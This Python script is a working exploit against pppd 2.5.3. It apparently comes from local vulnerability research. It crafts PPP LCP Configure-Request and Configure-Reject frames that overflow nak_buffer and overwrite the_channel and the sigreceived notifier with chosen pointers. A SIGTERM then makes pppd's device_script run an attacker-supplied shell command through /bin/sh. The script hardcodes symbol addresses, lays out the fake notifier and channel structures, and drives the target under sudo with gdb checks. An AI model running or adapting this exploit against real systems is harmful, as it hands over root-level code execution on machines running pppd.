#!/usr/bin/env python3
"""Local-only W131 experiment: hijack the sigreceived notifier head.

Differs from rce_attempt.py (W125) in two ways:

* the target is sigreceived (nak_buffer+1856), reached by notify() directly
  from the SIGTERM handler (main.c:1593-1600), so link_terminated() and its
  corrupted-the_channel dereference are bypassed;
* the callback is pppd's own device_script(char *, int, int, int), which
  executes execl("/bin/sh", "sh", "-c", program) at main.c:1868.  The extra
  argument notify() passes (the signal number) lands in the ignored `in`
  parameter; out/dont_wait take leftover register values.

the_channel is redirected to an all-zero region of inpacket_buf so the
child's `the_channel->close` test (main.c:1747, struct field offset 80)
reads NULL.  Both pointer writes use the existing escape 09 force bit.

No rung 5 is claimed unless a benign sentinel side effect is observed.
"""
import argparse
import json
import os
import struct
import subprocess
import time
from pathlib import Path

from chosen_write import fcs16, stuff, set_raw, frame_for, drain, find_pid

ROOT = Path(__file__).resolve().parent
LOGDIR = ROOT / "raw"
LOGDIR.mkdir(exist_ok=True)
SECRETS = Path("/run/pppd2shell-live/chap-secrets")

# Symbols of the pinned -no-pie 2.5.3 build (nm -n on build-vuln-nopie/pppd/pppd).
NAK_BUFFER = 0x467A40
INPACKET = 0x468820
REQCI_INP = INPACKET + 8          # main.c p+=PPP_HDRLEN; fsm.c inp+=HEADERLEN
DEVICE_SCRIPT = 0x42C78B
THE_CHANNEL_OFF = 1528            # 0x468038 - NAK_BUFFER
SIGRECEIVED_OFF = 1856            # 0x468180 - NAK_BUFFER
FAKE_CHANNEL_OFF = 128            # fake channel offset in the rejected body
NOTIFIER_OFF = 4                  # fake notifier offset in the rejected body
CMD_OFF = 28                      # command string offset in the rejected body
FORCE_BIT = 9                     # escape 09; bit 9 set in both be_values


def hdlc(info: bytes) -> bytes:
    core = bytes((0xFF, 0x03)) + struct.pack("!H", 0xC021) + info
    f = fcs16(core)
    return b"\x7e" + stuff(core + bytes((f & 0xFF, f >> 8))) + b"\x7e"


def rej_frame(body: bytes) -> bytes:
    return hdlc(struct.pack("!BBH", 1, 2, 4 + len(body)) + body)


def be_for_le_pointer(ptr: int) -> int:
    """PUTLONG writes big-endian; a LE pointer needs its bytes swapped."""
    return int.from_bytes(struct.pack("<I", ptr), "big")


def build_nak_frame(channel_ptr: int, notifier_ptr: int):
    """One ConfReq writing two chosen 32-bit NAK values in a single stream.

    Alignment (5-byte PAP NAKs, 6-byte ASYNCMAP NAKs with the value at +2):
      304 PAP -> filler ASYNC(value@1522) -> channel write(@1528)
      62 PAP -> two filler ASYNCs(@1844,@1850) -> notifier write(@1856)
    Total input body = 4*366 + 6*5 = 1494 bytes (info 1498 <= MRU 1500).
    """
    pap = bytes((3, 4, 0xC0, 0x23))
    filler = 1 << FORCE_BIT

    def async_ci(value: int) -> bytes:
        mask = 1 << FORCE_BIT
        assert value & mask, f"force bit not set in {value:08x}"
        return bytes((2, 6)) + struct.pack("!I", value & ~mask)

    channel_be = be_for_le_pointer(channel_ptr)
    notifier_be = be_for_le_pointer(notifier_ptr)
    assert channel_be & (1 << FORCE_BIT) and notifier_be & (1 << FORCE_BIT)

    # (kind, value): kind 0 = PAP (5 NAK bytes), kind 1 = ASYNCMAP (6 bytes,
    # four chosen value bytes starting two bytes into the NAK option).
    cis = ([(0, 0)] * 304 + [(1, filler), (1, channel_be)]
           + [(0, 0)] * 62 + [(1, filler), (1, filler), (1, notifier_be)])
    body = bytearray()
    offsets = []
    for kind, value in cis:
        if kind == 0:
            body += pap
        else:
            offsets.append(len(body) + 5 * 304 + 2)  # replaced below
            body += async_ci(value)
    assert len(body) == 1494, len(body)

    # Recompute value offsets from the real NAK byte stream.
    pos = 0
    offsets = []
    for kind, value in cis:
        if kind == 0:
            pos += 5
        else:
            pos += 2
            offsets.append(pos)
            pos += 4
    assert offsets == [1522, 1528, 1844, 1850, 1856], offsets
    assert pos == 1860, pos
    info = struct.pack("!BBH", 1, 1, 4 + len(body)) + bytes(body)
    assert len(info) == 1498
    layout = {
        "the_channel_offset": THE_CHANNEL_OFF,
        "sigreceived_offset": SIGRECEIVED_OFF,
        "channel_be": f"{channel_be:08x}",
        "notifier_be": f"{notifier_be:08x}",
        "channel_ptr": f"0x{channel_ptr:x}",
        "notifier_ptr": f"0x{notifier_ptr:x}",
        "device_script": f"0x{DEVICE_SCRIPT:x}",
        "forced_bit": FORCE_BIT,
        "info_len": len(info),
        "nak_value_offsets": offsets,
    }
    return hdlc(info), layout, {"the_channel": channel_ptr,
                                "sigreceived": notifier_ptr}


def build_rej_frame(command: bytes):
    """Bad-CI-length body copied verbatim into inpacket_buf after the NAK BCOPY.

    The NAK BCOPY (lcp.c:1853) fills inpacket_buf with the NAK stream, so the
    fake channel must be placed in this second frame, not in the zero tail.
    Its struct channel field 10 (close, byte offset 80) stays NULL.
    """
    notifier_ptr = REQCI_INP + NOTIFIER_OFF
    cmd_ptr = REQCI_INP + CMD_OFF
    body = bytearray(b"\x00\x00\x41\x41")
    body += struct.pack("<Q", 0)                 # notifier.next = NULL
    body += struct.pack("<Q", DEVICE_SCRIPT)     # notifier.func
    body += struct.pack("<Q", cmd_ptr)           # notifier.arg (shell program)
    body += b"\x00" * (CMD_OFF - len(body))
    body += command + b"\x00"
    body += b"\x00" * (FAKE_CHANNEL_OFF + 88 - len(body))
    assert body[FAKE_CHANNEL_OFF + 80:FAKE_CHANNEL_OFF + 88] == b"\x00" * 8
    return rej_frame(bytes(body)), notifier_ptr, cmd_ptr


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--marker", required=True)
    ap.add_argument("--command", required=True,
                    help="benign shell command for device_script to execute")
    ap.add_argument("--strace", action="store_true",
                    help="trace the child path (debug only)")
    ap.add_argument("--gdb", action="store_true",
                    help="follow the child under gdb and print a backtrace")
    a = ap.parse_args()

    out = Path("/tmp") / f"pppd2shell-r5-{a.marker}"
    out.unlink(missing_ok=True)
    cmd = a.command.encode()
    assert len(cmd) < 200

    rej, notifier_ptr, cmd_ptr = build_rej_frame(cmd)
    channel_ptr = REQCI_INP + FAKE_CHANNEL_OFF
    naka, layout, pointers = build_nak_frame(channel_ptr, notifier_ptr)
    (LOGDIR / f"{a.marker}-nak.bin").write_bytes(naka)
    (LOGDIR / f"{a.marker}-rej.bin").write_bytes(rej)

    secrets_local = LOGDIR / "chap-secrets"
    secrets_local.write_text('"labserver"\t*\t"labsecret"\t*\n'
                             '"labpeer"\t*\t"labsecret"\t*\n')
    subprocess.run(["sudo", "-n", "mkdir", "-p", str(SECRETS.parent)], check=True)
    subprocess.run(["sudo", "-n", "install", "-o", "root", "-g", "root",
                    "-m", "0600", str(secrets_local), str(SECRETS)], check=True)

    master, slave = os.openpty()
    set_raw(slave)
    slave_name = os.ttyname(slave)
    log_path = LOGDIR / f"{a.marker}-pppd.log"
    pppd_args = [
        a.binary,
        "nodetach", "passive", "local", "refuse-pap", "refuse-eap",
        "noip", "noipv6", "noproxyarp", "nolock", "debug",
        "escape", "09", "chap-secrets", str(SECRETS), "name", "labserver",
        slave_name,
    ]
    if a.strace:
        argv = ["sudo", "-n", "strace", "-f",
                "-o", str(LOGDIR / f"{a.marker}-strace.log"),
                "-e", "trace=execve,clone,fork,vfork,setuid,setgid,dup2,close,openat",
                *pppd_args]
    elif a.gdb:
        argv = ["sudo", "-n", "gdb", "-q", "-batch",
                "-ex", "set pagination off",
                "-ex", "set follow-fork-mode child",
                "-ex", "handle SIGTERM nostop nopass print",
                "-ex", "handle SIGCHLD nostop nopass print",
                "-ex", "handle SIGSEGV stop print nopass",
                "-ex", "run", "-ex", "bt", "-ex", "info registers",
                "--args", *pppd_args]
    else:
        argv = ["sudo", "-n", "env", "ASAN_OPTIONS=detect_leaks=0", *pppd_args]
    with open(log_path, "wb") as log:
        proc = subprocess.Popen(argv, stdin=subprocess.DEVNULL, stdout=log,
                                stderr=subprocess.STDOUT, close_fds=True)
    os.close(slave)
    os.set_blocking(master, False)
    early = drain(master, proc, 2.0)
    os.write(master, naka)
    after_nak = drain(master, proc, 1.0)
    os.write(master, rej)
    after_rej = drain(master, proc, 1.0)

    for name, blob in (("early", early), ("after-nak", after_nak),
                       ("after-rej", after_rej)):
        (LOGDIR / f"{a.marker}-{name}.bin").write_bytes(bytes(blob))

    live_pid = find_pid(a.binary, slave_name)
    if live_pid is not None:
        gargs = ["sudo", "-n", "gdb", "-q", "-batch", "-p", str(live_pid)]
        for c in ("set pagination off",
                  f"x/2gx {NAK_BUFFER + 1528:#x}",
                  f"x/2gx {NAK_BUFFER + 1856:#x}",
                  f"x/3gx {notifier_ptr:#x}",
                  f"x/12gx {REQCI_INP + FAKE_CHANNEL_OFF:#x}",
                  f"x/2gx {REQCI_INP + FAKE_CHANNEL_OFF + 80:#x}",
                  f"x/s {cmd_ptr:#x}", "detach"):
            gargs += ["-ex", c]
        try:
            gdb_txt = subprocess.run(gargs, capture_output=True, text=True,
                                     timeout=30).stdout
        except (subprocess.TimeoutExpired, OSError) as exc:
            gdb_txt = f"gdb failed: {exc}\n"
        (LOGDIR / f"{a.marker}-pre-signal-gdb.txt").write_text(gdb_txt)
        print(gdb_txt)

    if a.gdb:
        names = subprocess.run(["sudo", "-n", "pgrep", "-x", "pppd"],
                               capture_output=True, text=True).stdout.split()
        target_pid = int(names[-1]) if names else proc.pid
    else:
        target_pid = find_pid(a.binary, slave_name) or proc.pid
    subprocess.run(["sudo", "-n", "kill", "-TERM", str(target_pid)],
                   check=False)
    after_term = drain(master, proc, 3.0)
    (LOGDIR / f"{a.marker}-after-term.bin").write_bytes(bytes(after_term))
    time.sleep(1.0)
    side_effect = out.exists()
    if side_effect:
        (LOGDIR / f"{a.marker}-side-effect.txt").write_text(
            out.read_text(errors="replace"))

    rc = proc.poll()
    if rc is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)
    os.close(master)
    summary = {
        "marker": a.marker,
        "binary": a.binary,
        "command": a.command,
        "process_rc": rc,
        "side_effect_file": str(out),
        "side_effect_observed": side_effect,
        "pointers": {k: f"0x{v:x}" for k, v in pointers.items()},
        "nak_layout": layout,
        "notifier_ptr": f"0x{notifier_ptr:x}",
        "cmd_ptr": f"0x{cmd_ptr:x}",
        "after_term_preview": repr(bytes(after_term)[:200]),
    }
    (LOGDIR / f"{a.marker}-summary.json").write_text(
        json.dumps(summary, indent=2))
    print(json.dumps(summary, indent=2))
    return 0 if side_effect else 1


if __name__ == "__main__":
    raise SystemExit(main())
